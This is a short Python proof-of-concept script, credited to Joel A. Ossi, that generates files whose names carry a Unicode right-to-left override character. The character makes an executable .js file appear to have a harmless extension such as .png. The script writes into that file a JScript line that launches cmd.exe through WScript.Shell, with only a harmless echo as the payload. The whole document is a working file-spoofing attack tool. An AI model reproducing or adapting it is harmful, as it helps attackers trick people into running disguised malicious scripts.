#!/usr/bin/env python
# -*- coding: utf-8 -*-
# PoC By: Joel A. Ossi

from __future__ import unicode_literals

print('## Right-To-Left-Override File Generator  ##')
print('##     Unicode File Extention Spoofer     ##')
print('')

spoof = raw_input('ENTER EXTENTION TO SPOOF (Example: png): ')[::-1]
filename = raw_input('ENTER ORIGINAL FILE NAME (Example: test): ')
extention = raw_input('ENTER ORIGINAL FILE EXTENTION (Example: .js): ')
exploit = u"‮"
print('')

file=open(filename + exploit + spoof + extention,'w')
file.write("var run=new ActiveXObject('WSCRIPT.Shell').Run('cmd.exe /k echo RTLO ATTACK PoC');")
file.close()
print('[+] Build Saved.')
print('')
raw_input('PRESS ENTER KEY TO CONTINIUE')
